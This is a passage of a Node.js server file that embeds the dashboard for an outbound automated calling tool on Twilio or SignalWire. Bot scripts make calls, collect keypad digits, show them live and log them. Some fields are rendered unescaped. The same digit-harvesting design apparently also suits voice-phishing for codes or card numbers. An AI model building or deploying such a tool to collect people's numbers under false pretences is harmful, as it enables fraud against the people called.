  <div class="logo">
    <div class="logo-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2.5" stroke-linecap="round">
        <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 11.5a19.79 19.79 0 01-3.07-8.67A2 2 0 012 .84h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 8.14a16 16 0 006.29 6.29l1.42-1.42a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 16.92z"/>
      </svg>
    </div>
    <div class="logo-text">
      <div class="name" id="co-name">IVR Pro</div>
      <div class="sub" id="co-sub">Not configured</div>
    </div>
  </div>

  <!-- Provider Toggle -->
  <div class="provider-switch">
    <button class="prov-btn" id="btn-twilio" onclick="switchProvider('twilio')">📞 Twilio</button>
    <button class="prov-btn" id="btn-sw" onclick="switchProvider('signalwire')">⚡ SignalWire</button>
  </div>
  <div class="prov-status" id="prov-status">Loading...</div>

  <!-- Dialer -->
  <div class="dialer">
    <div class="sec-label">📲 New Call</div>
    <div class="field">
      <label>Customer Phone Number</label>
      <input type="tel" id="phoneInput" placeholder="+1 555 000 0000"/>
    </div>
    <div class="field">
      <label>Note / Label <span style="color:var(--text3)">(optional)</span></label>
      <input type="text" id="labelInput" placeholder="e.g. Invoice #042"/>
    </div>
    <div class="field">
      <label>Script to use</label>
      <div class="script-select-row">
        <select id="scriptSelect"></select>
      </div>
    </div>
    <button class="btn-call" id="callBtn" onclick="initiateCall()">
      <span id="callBtnIcon">📲</span>
      <span id="callBtnText">CALL NOW</span>
    </button>
    <button class="btn-test" onclick="testConn()">🔍 Test Connection</button>
    <div class="call-msg" id="callMsg"></div>
  </div>

  <!-- Stats -->
  <div class="stats">
    <div class="stats-row">
      <div class="stat"><div class="stat-n" id="st-active" style="color:var(--green)">0</div><div class="stat-l">Active</div></div>
      <div class="stat"><div class="stat-n" id="st-total" style="color:var(--blue)">0</div><div class="stat-l">Today</div></div>
      <div class="stat"><div class="stat-n" id="st-done">0</div><div class="stat-l">Done</div></div>
    </div>
    <div class="live-pill"><div class="dot"></div>Live · updates every 2s</div>
  </div>
</aside>

<!-- MAIN -->
<main class="main">
  <div class="tabbar">
    <button class="tab active" onclick="switchTab('monitor',this)">📊 Monitor</button>
    <button class="tab" onclick="switchTab('scripts',this)">📋 Scripts</button>
    <button class="tab" onclick="switchTab('logs',this)">📁 Call Logs</button>
    <button class="tab" onclick="switchTab('settings',this)">⚙️ Settings</button>
  </div>

  <!-- MONITOR -->
  <div id="panel-monitor" class="panel active">
    <div class="ph"><div><div class="ph-title">Live Monitor</div><div class="ph-sub">Active calls update in real time</div></div></div>
    <div class="mon-grid" id="mon-grid">
      <div class="empty" id="empty-mon">
        <div class="empty-icon">📵</div>
        <div class="empty-title">No active calls</div>
        <div class="empty-sub">Start a call from the sidebar.<br>Everything appears here live.</div>
      </div>
    </div>
  </div>

  <!-- SCRIPTS -->
  <div id="panel-scripts" class="panel">
    <div class="ph">
      <div><div class="ph-title">Script Builder</div><div class="ph-sub">Build and save multiple scripts — select one per call</div></div>
    </div>
    <!-- Library -->
    <div class="script-library" id="script-library"></div>
    <!-- Editor -->
    <div id="script-editor">
      <div class="script-name-bar">
        <input class="script-name-input" id="sname" placeholder="Script name..." value="Default Script"/>
      </div>
      <div class="ssec">
        <div class="ssec-title">Opening Greeting</div>
        <div class="fg">
          <div class="ff full"><label>Message (what bot says first)</label><textarea id="s-gmsg" rows="2"></textarea></div>
          <div class="ff"><label>Timeout (seconds)</label><input type="number" id="s-gtimeout" value="10" min="5" max="60"/></div>
          <div class="ff"><label>No-input message</label><input type="text" id="s-gnoinput"/></div>
        </div>
      </div>
      <div class="ssec">
        <div class="ssec-title">Collection Steps</div>
        <div id="steps-list"></div>
        <button class="btn-add" onclick="addStep()">+ Add Step</button>
      </div>
      <div class="ssec">
        <div class="ssec-title">Completion Messages</div>
        <div class="fg">
          <div class="ff full"><label>✅ Success (all done)</label><textarea id="s-success" rows="2"></textarea></div>
          <div class="ff full"><label>❌ Cancel (caller pressed 2)</label><textarea id="s-cancel" rows="2"></textarea></div>
          <div class="ff full"><label>⏱ Timeout (no input)</label><textarea id="s-error" rows="2"></textarea></div>
        </div>
      </div>
      <div class="save-row">
        <button class="btn-save" onclick="saveScript()">💾 Save Script</button>
        <button class="btn-save" style="background:var(--blue)" onclick="saveAsNew()">＋ Save as New</button>
        <span class="saved-msg" id="script-saved">✓ Saved!</span>
      </div>
    </div>
  </div>

  <!-- LOGS -->
  <div id="panel-logs" class="panel">
    <div class="ph">
      <div><div class="ph-title">Call Logs</div><div class="ph-sub">Full history of every call with details</div></div>
      <button class="btn-clear" onclick="clearAllLogs()">🗑 Clear All Logs</button>
    </div>
    <div id="logs-container"></div>
  </div>

  <!-- SETTINGS -->
  <div id="panel-settings" class="panel">
    <div class="ph"><div><div class="ph-title">Settings</div><div class="ph-sub">Credentials, voice, and provider configuration</div></div></div>

    <div class="cfg-sec">
      <div class="cfg-title">General</div>
      <div class="cfg-grid">
        <div class="cf cfg-full"><label>Company Name</label><input type="text" id="cfg-company" placeholder="My Company"/></div>
        <div class="cf"><label>Language</label>
          <select id="cfg-lang">
            <option value="en-US">English (US)</option><option value="en-GB">English (UK)</option>
            <option value="en-AU">English (Australia)</option><option value="fr-FR">French</option>
            <option value="de-DE">German</option><option value="es-ES">Spanish (Spain)</option>
            <option value="es-MX">Spanish (Mexico)</option><option value="pt-BR">Portuguese (Brazil)</option>
          </select>
        </div>
      </div>
    </div>

    <!-- Twilio -->
    <div class="cfg-sec" id="cfg-twilio">
      <div class="cfg-title" style="color:var(--blue)">📞 Twilio Credentials</div>
      <div class="cfg-grid">
        <div class="cf"><label>Account SID</label><input type="text" id="tw-sid" placeholder="ACxxxxxxxxxxxxxxxx"/><span class="note">From <a href="https://console.twilio.com" target="_blank">console.twilio.com</a></span></div>
        <div class="cf"><label>Auth Token</label><input type="password" id="tw-token" placeholder="Your auth token"/></div>
        <div class="cf"><label>Phone Number (From)</label><input type="tel" id="tw-from" placeholder="+15551234567"/></div>
        <div class="cf"><label>Server Public URL</label><div class="url-row"><input type="text" id="tw-url" placeholder="https://your-app.onrender.com"/><button class="btn-detect" onclick="autoDetect('tw-url')">Auto</button></div><span class="note">Your Render URL. Click Auto to detect.</span></div>
      </div>
    </div>

    <!-- SignalWire -->
    <div class="cfg-sec" id="cfg-sw">
      <div class="cfg-title" style="color:var(--purple)">⚡ SignalWire Credentials</div>
      <div class="sw-provider-notice">SignalWire is Twilio-compatible and often 3-5× cheaper per minute. Sign up at <a href="https://signalwire.com" target="_blank" style="color:var(--purple)">signalwire.com</a> → create a project → get your credentials below.</div>
      <div class="cfg-grid">
        <div class="cf"><label>Project ID</label><input type="text" id="sw-pid" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"/></div>
        <div class="cf"><label>Auth Token</label><input type="password" id="sw-token" placeholder="Your auth token"/></div>
        <div class="cf"><label>Phone Number (From)</label><input type="tel" id="sw-from" placeholder="+15551234567"/></div>
        <div class="cf"><label>Space URL</label><input type="text" id="sw-space" placeholder="yourspace.signalwire.com"/><span class="note">Found in your SignalWire project dashboard</span></div>
        <div class="cf"><label>Server Public URL</label><div class="url-row"><input type="text" id="sw-url" placeholder="https://your-app.onrender.com"/><button class="btn-detect" onclick="autoDetect('sw-url')">Auto</button></div></div>
      </div>
    </div>

    <!-- Voice -->
    <div class="cfg-sec">
      <div class="cfg-title">Voice</div>
      <div class="voice-grid" id="voice-grid"></div>
    </div>

    <div class="save-row">
      <button class="btn-save" onclick="saveSettings()">💾 Save Settings</button>
      <span class="saved-msg" id="settings-saved">✓ Saved!</span>
    </div>
  </div>

</main>
</div>

<script>
const VOICES=[
  {id:"alice",name:"Alice",desc:"Standard female",tag:"free",g:"F"},
  {id:"woman",name:"Woman",desc:"Basic female",tag:"free",g:"F"},
  {id:"man",name:"Man",desc:"Basic male",tag:"free",g:"M"},
  {id:"Polly.Joanna",name:"Joanna",desc:"US English female",tag:"natural",g:"F"},
  {id:"Polly.Matthew",name:"Matthew",desc:"US English male",tag:"natural",g:"M"},
  {id:"Polly.Amy",name:"Amy",desc:"British female",tag:"natural",g:"F"},
  {id:"Polly.Brian",name:"Brian",desc:"British male",tag:"natural",g:"M"},
  {id:"Polly.Salli",name:"Salli",desc:"US female neural",tag:"premium",g:"F"},
  {id:"Polly.Joey",name:"Joey",desc:"US male neural",tag:"premium",g:"M"},
  {id:"Polly.Nicole",name:"Nicole",desc:"Australian female",tag:"natural",g:"F"},
  {id:"Polly.Russell",name:"Russell",desc:"Australian male",tag:"natural",g:"M"},
];

let settings={};
let scripts=[];
let sessions=[];
let logs=[];
let editingScriptId=null;
let scriptSteps=[];

// ── TABS ─────────────────────────────────────────────────────────────────────
function switchTab(id,btn){
  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
  document.getElementById('panel-'+id).classList.add('active');
  btn.classList.add('active');
  if(id==='logs') loadLogs();
}

// ── PROVIDER ──────────────────────────────────────────────────────────────────
function switchProvider(p){
  const s={...settings, activeProvider:p};
  fetch('/api/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({activeProvider:p})});
  settings.activeProvider=p;
  updateProviderUI(p);
}
function updateProviderUI(p){
  document.getElementById('btn-twilio').className='prov-btn'+(p==='twilio'?' active-tw':'');
  document.getElementById('btn-sw').className='prov-btn'+(p==='signalwire'?' active-sw':'');
  document.getElementById('prov-status').textContent=p==='twilio'?'Using Twilio':'Using SignalWire';
  document.getElementById('co-sub').textContent=p==='twilio'?'Twilio Active':'SignalWire Active';
}

// ── SETTINGS ──────────────────────────────────────────────────────────────────
async function loadSettings(){
  const r=await fetch('/api/settings');
  settings=await r.json();
  document.getElementById('cfg-company').value=settings.companyName||'';
  document.getElementById('cfg-lang').value=settings.language||'en-US';
  const tw=settings.twilio||{};
  document.getElementById('tw-sid').value=tw.accountSid||'';
  document.getElementById('tw-token').value=tw.authToken||'';
  document.getElementById('tw-from').value=tw.fromNumber||'';
  document.getElementById('tw-url').value=tw.baseUrl||'';
  const sw=settings.signalwire||{};
  document.getElementById('sw-pid').value=sw.projectId||'';
  document.getElementById('sw-token').value=sw.authToken||'';
  document.getElementById('sw-from').value=sw.fromNumber||'';
  document.getElementById('sw-space').value=sw.spaceUrl||'';
  document.getElementById('sw-url').value=sw.baseUrl||'';
  document.getElementById('co-name').textContent=settings.companyName||'IVR Pro';
  renderVoices(settings.voice||'alice');
  updateProviderUI(settings.activeProvider||'twilio');
}
async function saveSettings(){
  const payload={
    companyName:document.getElementById('cfg-company').value,
    language:document.getElementById('cfg-lang').value,
    voice:document.querySelector('input[name="voice"]:checked')?.value||'alice',
    twilio:{accountSid:document.getElementById('tw-sid').value,authToken:document.getElementById('tw-token').value,fromNumber:document.getElementById('tw-from').value,baseUrl:document.getElementById('tw-url').value},
    signalwire:{projectId:document.getElementById('sw-pid').value,authToken:document.getElementById('sw-token').value,fromNumber:document.getElementById('sw-from').value,spaceUrl:document.getElementById('sw-space').value,baseUrl:document.getElementById('sw-url').value}
  };
  await fetch('/api/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
  document.getElementById('co-name').textContent=payload.companyName||'IVR Pro';
  showSaved('settings-saved');
}
function renderVoices(sel){
  document.getElementById('voice-grid').innerHTML=VOICES.map(v=>\`
    <label class="vo"><input type="radio" name="voice" value="\${v.id}" \${v.id===sel?'checked':''}>
    <div class="vo-name">\${v.name} <span style="font-size:9px;color:var(--text3)">\${v.g}</span></div>
    <div class="vo-desc">\${v.desc}</div>
    <span class="vo-tag tag-\${v.tag}">\${v.tag==='free'?'Free':v.tag==='natural'?'Natural':'Neural'}</span>
    </label>\`).join('');
}
function autoDetect(id){document.getElementById(id).value=window.location.origin;}

// ── SCRIPTS ───────────────────────────────────────────────────────────────────
async function loadScripts(){
  const r=await fetch('/api/scripts');
  scripts=await r.json();
  renderScriptLibrary();
  renderScriptSelect();
  // Load default into editor
  const def=scripts.find(s=>s.isDefault)||scripts[0];
  if(def) loadScriptIntoEditor(def);
}
function renderScriptLibrary(){
  const lib=document.getElementById('script-library');
  lib.innerHTML=scripts.map(s=>\`
    <div class="slib-card \${s.id===editingScriptId?'selected':''} \${s.isDefault?'is-default':''}" onclick="loadScriptIntoEditor(scripts.find(x=>x.id==='\${s.id}'))">
      <div class="slib-name">\${esc(s.name)}</div>
      <div class="slib-meta">\${s.steps?.length||0} steps · \${s.isDefault?'<span style="color:var(--green)">Default</span>':'Not default'}</div>
      <div class="slib-actions">
        <button class="btn-slib set-default" onclick="event.stopPropagation();setDefault('\${s.id}')">\${s.isDefault?'✓ Default':'Set Default'}</button>
        \${scripts.length>1?('<button class="btn-slib danger" onclick="event.stopPropagation();deleteScript(\\'' + s.id + '\\')">Delete</button>'):''}  
      </div>
    </div>
  \`).join('') + \`
    <div class="slib-card slib-new" onclick="newScript()">
      <div class="slib-new-icon">＋</div>
      <div style="font-size:12px">New Script</div>
    </div>\`;
}
function renderScriptSelect(){
  const sel=document.getElementById('scriptSelect');
  const cur=sel.value;
  sel.innerHTML=scripts.map(s=>\`<option value="\${s.id}" \${s.isDefault?'':''} >\${esc(s.name)}\${s.isDefault?' ★':''}</option>\`).join('');
  const def=scripts.find(s=>s.isDefault);
  if(def) sel.value=def.id;
  else if(cur) sel.value=cur;
}
function loadScriptIntoEditor(s){
  if(!s) return;
  editingScriptId=s.id;
  document.getElementById('sname').value=s.name||'';
  document.getElementById('s-gmsg').value=s.greeting?.message||'';
  document.getElementById('s-gtimeout').value=s.greeting?.timeout||10;
  document.getElementById('s-gnoinput').value=s.greeting?.noInputMessage||'';
  document.getElementById('s-success').value=s.successMessage||'';
  document.getElementById('s-cancel').value=s.cancelMessage||'';
  document.getElementById('s-error').value=s.errorMessage||'';
  scriptSteps=s.steps?JSON.parse(JSON.stringify(s.steps)):[];
  renderSteps();
  renderScriptLibrary();
}
function newScript(){
  editingScriptId=null;
  document.getElementById('sname').value='New Script';
  document.getElementById('s-gmsg').value='Hello! Press 1 to continue, or press 2 to end this call.';
  document.getElementById('s-gtimeout').value=10;
  document.getElementById('s-gnoinput').value='We did not receive your input. Goodbye.';
  document.getElementById('s-success').value='Thank you. Your information has been received. Goodbye.';
  document.getElementById('s-cancel').value='No problem. Your request has been cancelled. Goodbye.';
  document.getElementById('s-error').value='We did not receive your input. Please call us back. Goodbye.';
  scriptSteps=[{label:'Step 1',message:'',maxDigits:5,timeout:15,confirmMessage:'Thank you. '}];
  renderSteps();
}
async function saveScript(){
  const data=buildScriptData();
  data.id=editingScriptId;
  const r=await fetch('/api/scripts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
  const res=await r.json();
  scripts=res.scripts;
  renderScriptLibrary();
  renderScriptSelect();
  showSaved('script-saved');
}
async function saveAsNew(){
  const data=buildScriptData();
  data.id=null;
  const r=await fetch('/api/scripts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
  const res=await r.json();
  scripts=res.scripts;
  // Get the new script id
  const newest=scripts.find(s=>s.name===data.name&&!s.isDefault)||scripts[scripts.length-1];
  editingScriptId=newest.id;
  renderScriptLibrary();
  renderScriptSelect();
  showSaved('script-saved');
}
function buildScriptData(){
  return {
    name:document.getElementById('sname').value||'Unnamed Script',
    greeting:{message:document.getElementById('s-gmsg').value,timeout:parseInt(document.getElementById('s-gtimeout').value)||10,noInputMessage:document.getElementById('s-gnoinput').value},
    steps:collectSteps(),
    successMessage:document.getElementById('s-success').value,
    cancelMessage:document.getElementById('s-cancel').value,
    errorMessage:document.getElementById('s-error').value
  };
}
async function setDefault(id){
  await fetch('/api/scripts/'+id+'/default',{method:'POST'});
  const r=await fetch('/api/scripts');
  scripts=await r.json();
  renderScriptLibrary();
  renderScriptSelect();
}
async function deleteScript(id){
  if(!confirm('Delete this script?')) return;
  const r=await fetch('/api/scripts/'+id,{method:'DELETE'});
  const res=await r.json();
  scripts=res.scripts;
  if(editingScriptId===id){
    const def=scripts.find(s=>s.isDefault)||scripts[0];
    loadScriptIntoEditor(def);
  }
  renderScriptLibrary();
  renderScriptSelect();
}
function renderSteps(){
  document.getElementById('steps-list').innerHTML=scriptSteps.map((s,i)=>\`
    <div class="step-card">
      <div class="step-hd">
        <div class="step-num">\${i+1}</div>
        <input class="step-name" value="\${esc(s.label)}" placeholder="Step name"/>
        <button class="btn-rm" onclick="removeStep(\${i})">×</button>
      </div>
      <div class="sg">
        <div class="sf full"><label>What bot says</label><textarea class="step-msg" rows="2" placeholder="Please enter...">\${esc(s.message)}</textarea></div>
        <div class="sf"><label>Max digits</label><input type="number" class="step-digits" value="\${s.maxDigits||5}" min="1" max="20"/></div>
        <div class="sf"><label>Timeout (s)</label><input type="number" class="step-timeout" value="\${s.timeout||15}" min="5" max="60"/></div>
        <div class="sf full"><label>Confirmation (after input)</label><input type="text" class="step-confirm" value="\${esc(s.confirmMessage||'')}"/></div>
      </div>
    </div>\`).join('');
}
function addStep(){scriptSteps.push({label:'Step '+(scriptSteps.length+1),message:'',maxDigits:5,timeout:15,confirmMessage:'Thank you. '});renderSteps();}
function removeStep(i){if(scriptSteps.length<=1){alert('Need at least one step.');return;}scriptSteps.splice(i,1);renderSteps();}
function collectSteps(){
  return Array.from(document.querySelectorAll('.step-card')).map((c,i)=>({
    label:c.querySelector('.step-name').value||'Step '+(i+1),
    message:c.querySelector('.step-msg').value,
    maxDigits:parseInt(c.querySelector('.step-digits').value)||5,
    timeout:parseInt(c.querySelector('.step-timeout').value)||15,
    confirmMessage:c.querySelector('.step-confirm').value
  }));
}

// ── CALL ──────────────────────────────────────────────────────────────────────
async function initiateCall(){
  const phone=document.getElementById('phoneInput').value.trim();
  const label=document.getElementById('labelInput').value.trim();
  const scriptId=document.getElementById('scriptSelect').value;
  if(!phone){showMsg('Please enter a phone number.','err');return;}
  const btn=document.getElementById('callBtn');
  btn.disabled=true;
  document.getElementById('callBtnText').textContent='CALLING...';
  document.getElementById('callBtnIcon').textContent='⏳';
  hideMsg();
  try{
    const r=await fetch('/api/call',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phoneNumber:phone,label:label||'Call',scriptId})});
    const d=await r.json();
    if(d.success){
      showMsg('✅ Call started! Watch the monitor.','ok');
      document.getElementById('phoneInput').value='';
      document.getElementById('labelInput').value='';
      switchTab('monitor',document.querySelector('.tab'));
    }else{
      showMsg('❌ '+( d.error||'Unknown error'),'err');
    }
  }catch(e){showMsg('❌ Cannot connect to server.','err');}
  btn.disabled=false;
  document.getElementById('callBtnText').textContent='CALL NOW';
  document.getElementById('callBtnIcon').textContent='📲';
}
async function endCall(sid){
  const r=await fetch('/api/call/'+sid+'/end',{method:'POST'});
  const d=await r.json();
  if(!d.success) alert('Could not end call: '+d.error);
}
async function testConn(){
  showMsg('⏳ Testing...','info');
  try{
    const r=await fetch('/api/test');
    const d=await r.json();
    if(d.ok) showMsg('✅ Connected to '+d.provider+': '+d.name,'ok');
    else showMsg('❌ '+d.error,'err');
  }catch(e){showMsg('❌ Cannot reach server.','err');}
}
function showMsg(txt,type){const el=document.getElementById('callMsg');el.textContent=txt;el.className='call-msg '+type;el.style.display='block';}
function hideMsg(){const el=document.getElementById('callMsg');el.style.display='none';el.className='call-msg';}
document.getElementById('phoneInput').addEventListener('keypress',e=>{if(e.key==='Enter')initiateCall();});

// ── MONITOR ───────────────────────────────────────────────────────────────────
async function pollSessions(){
  try{
    const r=await fetch('/api/sessions');
    sessions=await r.json();
    renderMonitor();
    updateStats();
  }catch(e){}
}
function updateStats(){
  const active=sessions.filter(s=>['in-progress','initiated','ringing'].includes(s.status)).length;
  const done=sessions.filter(s=>s.status==='completed').length;
  document.getElementById('st-active').textContent=active;
  document.getElementById('st-total').textContent=sessions.length;
  document.getElementById('st-done').textContent=done;
}
function renderMonitor(){
  const grid=document.getElementById('mon-grid');
  const empty=document.getElementById('empty-mon');
  if(!sessions.length){empty.style.display='flex';return;}
  empty.style.display='none';
  const totalSteps=editingScriptId?scriptSteps.length:0;
  sessions.forEach(s=>{
    let card=document.getElementById('mc-'+s.callSid);
    if(!card){card=document.createElement('div');card.id='mc-'+s.callSid;grid.insertBefore(card,grid.firstChild);}
    const isActive=['in-progress','initiated','ringing'].includes(s.status);
    const badge=\`<span class="badge badge-\${s.status}"><span class="bdot \${isActive?'bdot-pulse':''}"></span>\${s.status.replace(/-/g,' ').toUpperCase()}</span>\`;
    const prog=s.steps>0?'<div class="prog-track">'+Array.from({length:s.steps},(_,i)=>{const cl=i<s.collected.length?'done':(i===s.collected.length&&isActive?'active':'');return\`<div class="pseg \${cl}"></div>\`}).join('')+'</div>':'';
    const coll=s.collected.length?'<div class="coll-list">'+s.collected.map(c=>\`<div class="coll-item"><span class="ci-lbl">\${c.label}</span><span class="ci-val">\${c.value}</span><span class="ci-t">\${new Date(c.time).toLocaleTimeString()}</span></div>\`).join('')+'</div>':'';
    const dur=s.duration?('<span class="dur">'+Math.floor(s.duration/60)+'m '+s.duration%60+'s</span>'):isActive?'<span style="color:var(--green);font-size:11px">● Live</span>':'';
    const endBtn=isActive?('<button class="btn-sm end-call" onclick="endCall(\'' + s.callSid + \')">⏹ End Call</button>'):'';
    const copyBtn=s.collected.length?('<button class="btn-sm" onclick="copyData(\'' + s.callSid + \')">Copy</button>'):'';
    card.className='ccard s-'+s.status.replace(/[^a-z-]/g,'');
    card.innerHTML=\`
      <div class="chead">
        <div><div class="cphone">\${s.phone}</div><div class="clabel">\${s.label} · \${s.scriptName||''}</div></div>
        <div class="cright"><div class="ctime">\${new Date(s.startTime).toLocaleTimeString()}</div>\${badge}</div>
      </div>
      <div class="cbody">
        \${prog}\${coll}
        \${s.statusDetail?'<div style="font-size:11px;color:var(--text2);margin-top:8px"><span class="sdot \${isActive?'active':''}"></span>'+s.statusDetail+'</div>':''}
      </div>
      <div class="cfoot"><div class="cdetail">\${dur}</div><div class="cactions">\${endBtn}\${copyBtn}</div></div>\`;
  });
}
function copyData(sid){
  const s=sessions.find(x=>x.callSid===sid);if(!s)return;
  const lines=['Phone: '+s.phone,'Label: '+s.label,'Time: '+new Date(s.startTime).toLocaleString(),'',
    ...s.collected.map(c=>c.label+': '+c.value)];
  navigator.clipboard.writeText(lines.join('\\n')).then(()=>{
    const btn=document.querySelector('#mc-'+sid+' .btn-sm:not(.end-call)');
    if(btn){btn.textContent='✓ Copied!';setTimeout(()=>btn.textContent='Copy',1500);}
  });
}

// ── LOGS ──────────────────────────────────────────────────────────────────────
async function loadLogs(){
  const r=await fetch('/api/logs');
  logs=await r.json();
  renderLogs();
}
function renderLogs(){
  const c=document.getElementById('logs-container');
  if(!logs.length){c.innerHTML='<div class="no-logs">📭 No call logs yet</div>';return;}
  c.innerHTML=\`<table class="log-table">
    <thead><tr>
      <th>Phone</th><th>Label</th><th>Script</th><th>Provider</th><th>Status</th><th>Duration</th><th>Time</th><th>Data</th><th></th>
    </tr></thead>
    <tbody>\${logs.map(l=>{
      const dur=l.duration?Math.floor(l.duration/60)+'m '+l.duration%60+'s':'—';
      const t=new Date(l.startTime).toLocaleString();
      const hasData=l.collected&&l.collected.length>0;
      return\`
        <tr>
          <td style="font-family:var(--mono);font-weight:600">\${l.phone}</td>
          <td>\${l.label}</td>
          <td style="color:var(--text2)">\${l.scriptName||'—'}</td>
          <td><span style="font-size:10px;padding:2px 6px;border-radius:4px;background:\${l.provider==='twilio'?'#4a8ff720':'#9d7cfa20'};color:\${l.provider==='twilio'?'var(--blue)':'var(--purple)'}">\${(l.provider||'—').toUpperCase()}</span></td>
          <td><span class="badge badge-\${l.status}" style="font-size:9px">\${l.status.replace(/-/g,' ').toUpperCase()}</span></td>
          <td class="dur">\${dur}</td>
          <td style="color:var(--text2);font-size:11px">\${t}</td>
          <td>\${hasData?('<span class="log-expand" onclick="toggleDetail(\'' + l.id + \')">View ▾</span>'):''}</td>
          <td><button class="btn-sm danger" onclick="deleteLog('\${l.id}')">🗑</button></td>
        </tr>
        \${hasData?('<tr><td colspan="9" class="log-detail" id="ld-' + l.id + '"><div class="detail-grid">' + (l.collected||[]).map(c=>'<div class="detail-chip"><div class="dc-label">' + c.label + '</div><div class="dc-val">' + c.value + '</div></div>').join('') + '</div></td></tr>'):''}\`}).join('')}
    </tbody></table>\`;
}
function toggleDetail(id){const el=document.getElementById('ld-'+id);if(el) el.classList.toggle('open');}
async function deleteLog(id){
  await fetch('/api/logs/'+id,{method:'DELETE'});
  logs=logs.filter(l=>l.id!==id);
  renderLogs();
}
async function clearAllLogs(){
  if(!confirm('Clear all call logs?')) return;
  await fetch('/api/logs',{method:'DELETE'});
  logs=[];
  renderLogs();
}

// ── UTILS ─────────────────────────────────────────────────────────────────────
function esc(s){return(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function showSaved(id){const el=document.getElementById(id);el.classList.add('show');setTimeout(()=>el.classList.remove('show'),2500);}

// ── INIT ──────────────────────────────────────────────────────────────────────
loadSettings();
loadScripts();
pollSessions();
setInterval(pollSessions,2000);
</script>
</body>
</html>`;

app.get("/", (req,res) => res.send(DASHBOARD_HTML));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("\n✅ IVR Pro v3 → http://localhost:" + PORT + "\n"));
